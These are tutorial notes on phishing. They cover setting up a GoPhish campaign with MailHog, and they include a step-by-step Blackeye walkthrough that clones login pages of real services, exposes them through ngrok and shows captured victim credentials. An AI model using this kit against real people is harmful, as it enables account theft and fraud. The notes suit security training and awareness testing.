#+title:Phishing
#+OPTIONS: \n:t
#+roam_tags: Social_Engineering
#+attr_html: :width 100px

[WARNING: WRITER ARE NOT RESPONSIBLE FOR ANY MISUSE OR DAMAGE CAUSED BY USING TOOLS MENTIONED IN THIS REPO. IT IS ILLEGAL TO USE THIS TOOLS WITHOUT MUTUAL CONSENT, YOU'VE BEEN WARNED!]

Phishing is a type of attack that are using E-mail, voice (Vishing), or SMS (smishing) to attack its target. This kind of attack can be pointed into an individual which is called as spear phishing. Phishing has been around since 90s targeting America Online (AOL). In these day and age, phishing is disguised in many ways, from E-mail notification of a big company sending you money, or even from a fake account that are sending you "love letter" with malware in disguise.

** How does it work?

Phishing can be done in multiple ways, while phishing itself can be run through E-mail, you might want to use other means of attack if you are targeting a specific person that might or might not use E-mail. Whatsapp, social media, can be used for Phishing campaign, it is because the educational backgrounds in social media nowadays are mostly teenagers, which is a possible target for phishing.

Phishing servers are usually run on cloud services, or can be hosted local in a computer, but since Phishers are sneaky, one might use public instances to do the attack. Each fake E-mail is sent to victim(s) E-mail address in lieu of other means of attack said above. Digital Ocean or AWS might be a good place to hosts this server. While the E-mail is sent, Phishers might get notice when the link is clicked or opened, if the E-mail is read or not, if the Landing Page sent already have forms filled by victim(s) or not, and any information related to the campaign.

** Gophish

WEB: https://getgophish.com | GIT: https://github.com/gophish/gophish

GoPhish can be used to create a campaign based Phishing environment, for this environment to work, we have to set up some boundaries first, one rule of thumb, do not use your personal mail address for this. =Mailhog= will help assigning email@localhost.localdomain to hog all the mail that sent or receive during the campaign, it is possible to use other E-mail address, but there's some issues that when sent to an E-mail address based on Google, it is possible that it will already flagged as spam or something else to help with the security.

There are multiple preparation that you can do to help with assigning things later for gophish:
- AWS, Azure, Digital Ocean, or local can be used as the base for GoPhish server.
- GoPhish might want E-mail address like Mailhog or other E-mail services that have smtp available can be used.
- Target E-mail, E-mail content, and a Landing Page, are needed for GoPhish to work.
  + GoPhish might want a Landing Page that are possible to be duplicated, as of writing, it is currently not possible to copy Facebook based web address, but your mileage may vary.
  + GoPhish also want E-mails that can use smtp, the username and password in the page needs your e-mail credentials, this is why it is not even recommended to use your personal address, use E-mail services that are not connected to you by any means.

#+begin_src shell
# GoPhish
$ mkdir -p ~/opt/gophish
$ cd ~/opt/gophish
$ curl -L https://github.com/gophish/gophish/releases/download/0.7.1/gophish-v0.7.1-linux-64bit.zip -o gophish.zip
$ unzip gophish.zip

# MailHog
$ sudo apt-get -y install golang-go
$ go get github.com/mailhog/MailHog
#+end_src

#+RESULTS:

Once you clone GoPhish and installing MailHog, you can then run it via command line by running:

#+begin_src shell
# 1st Terminal
$ cd ~/opt/gophish
$ sudo ./gophish

# 2nd Terminal
$ cd ~/go/bin
$ sudo ./MailHog
#+end_src

Once you run it on *separate* terminal, now we need to go to https://localhost:3333 for GoPhish and https://localhost:8025 for MailHog. There are some templates you have to fill before we launch the attack, this will be discussed on the next section. Username for *GoPhish* is =admin= & =gophish=.

*** Sending Profile

[[./Assets/GoPhish_Sending_Profiles.png]]

You might want to use port =1025= for smtp, it will be already configured if you run MailHog, this will send email to that smtp address, also you can try =Send Test Email= to check if it is sending to the right address.


*** Landing Pages

[[./Assets/GoPhish_Landing_Pages.png]]
[[./Assets/GoPhish_Landing_Pages_URL.png]]

Here will be where you import the site, click on import and include URL to the page that you want to clone, also you can redirect it to the real address.

*** E-Mail Templates

[[./Assets/GoPhish_Email.png]]

#+begin_src
Subject {{.Email}}

{{.FirstName}},

The password for {{.Email}} has expired.

Please reset your password here.

Thanks, Campus Ground

{{.Tracker}}
#+end_src

You can use Templates as above, it is taken from official GoPhish documentation page, you might want to go [[https://docs.getgophish.com/user-guide/building-your-first-campaign/creating-the-template][here]]. It is also possible to include attachments using this email, since it is only for testing purpose, it will attached nothing.

[[./Assets/GoPhish_Email_URL.png]]

To include the url, you have to highlight the word here and click *link* button in the html editor, it will then brought you this window to include your URL.

*** Groups

[[./Assets/GoPhish_Groups.png]]


Since it is possible if you want to send it to multiple people, you can have it inside the groups, you can import it using CSVs.

*** Launching Campaign

After all the preparation, we can then go to *Campaign* page and create a new campaign, you can also clone or edit your campaign here.

[[./Assets/GoPhish_Campaign.png]]

Be sure to point the URL to your localhost for this, or to the server you're running if you're using instances like Digital Ocean or AWS.

*** Dashboard

You can then see your victims and overall status from the dashboard area.

[[./Assets/GoPhish_Dashboard.png]]
[[./Assets/GoPhish_Results.png]]


*** MailHog

This will be the E-mail that you get from GoPhish.

[[./Assets/MailHog.png]]


** Blackeye

GIT: https://github.com/An0nUD4Y/blackeye

Installation:
- PHP ( Should be available in Kali Linux )
- Ngrok ( Create your account first )
- GIthub Account ( Easier )

[ WARNING ] This preparation are needed if =blackeye.sh= not working as intended, as precaution, we have to manually run the ngrok server and serve the php to our http://localhost:8080 ( or another port ) to get it to works. Go to next section to actually run =blackeye=.

Here is the command you need to install and setup ngrok manually, though you will proabably be downloading this again in =blackeye=, so you might want to copy ngrok to your =blackeye= folder later. Authtoken can be seen [[https://dashboard.ngrok.com/get-started/your-authtoken][here]].

#+begin_src shell
$ git clone https://github.com/An0nUD4Y/blackeye
$ cd blackeye
$ wget https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-amd64.zip
$ unzip ngrok-stable-linux-amd64.zip
$ ./ngrok authtoken 0000000000000000000000000000000000000000000000000
#+end_src

If you run ngrok server by itself, it will be seen like this:

#+begin_src shell
ngrok by @inconshreveable

Session Status                online
Account                       account-name (Plan: Free)
Version                       2.3.35
Region                        United States (us)
Web Interface                 http://127.0.0.1:4040
Forwarding                    http://alphanumeric.ngrok.io -> http://localhost:8080
Forwarding                    https://alphanumeric.ngrok.io -> http://localhost:8080

Connections                   ttl     opn     rt1     rt5     p50     p90
                              22      0       0.25    0.07    0.06    3.14
#+end_src

As of when this articles made, you can access http://127.0.0.1:4040/status to check ngrok status and below =command_line= section, you will see your URL that can be used.

#+begin_src shell
$ sudo ./blackeye.sh # Password Needed

[sudo] password for archaict:

     :: Disclaimer: Developers assume no liability and are not    ::
     :: responsible for any misuse or damage caused by BlackEye.  ::
     :: Only use for educational purporses!!                      ::

     ::     BLACKEYE v1.5! By @suljot_gjoka & @thelinuxchoice     ::

          [01] Instagram      [17] DropBox        [33] eBay
          [02] Facebook       [18] Adobe ID       [34] Amazon
          [03] Snapchat       [19] Shopify        [35] iCloud
          [04] Twitter        [20] Messenger      [36] Spotify
          [05] Github         [21] GitLab         [37] Netflix
          [06] Google         [22] Twitch         [38] Custom
          [07] Origin         [23] MySpace
          [08] Yahoo          [24] Badoo
          [09] Linkedin       [25] VK
          [10] Protonmail     [26] Yandex
          [11] Wordpress      [27] devianART
          [12] Microsoft      [28] Wi-Fi
          [13] IGFollowers    [29] PayPal
          [14] Pinterest      [30] Steam
          [15] Apple ID       [31] Bitcoin
          [16] Verizon        [32] Playstation

[*] Choose an option: 1 # choose your poison

[*] Starting php server...
[*] Starting ngrok server...
[*] Send this link to the Victim: # check http://localhost:4040
[*] Waiting victim open the link ...

[*] IP Found!
[*] Victim IP: 127.0.0.1 # It will be your public IP here (SECRET)
[*] User-Agent:  User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/XX.0
[*] Saved: instagram/saved.ip.txt

[*] Waiting credentials ...

[*] Credentials Found!
[*] Account: helloWorld
[*] Password:  12345678
[*] Saved: sites/instagram/saved.usernames.txt
#+end_src

If your php is not connected, you can do this instead before running =blackeye=.

#+begin_src shell
$ php -d /path/to/blackeye/sites/instagram -S localhost:8080
#+end_src
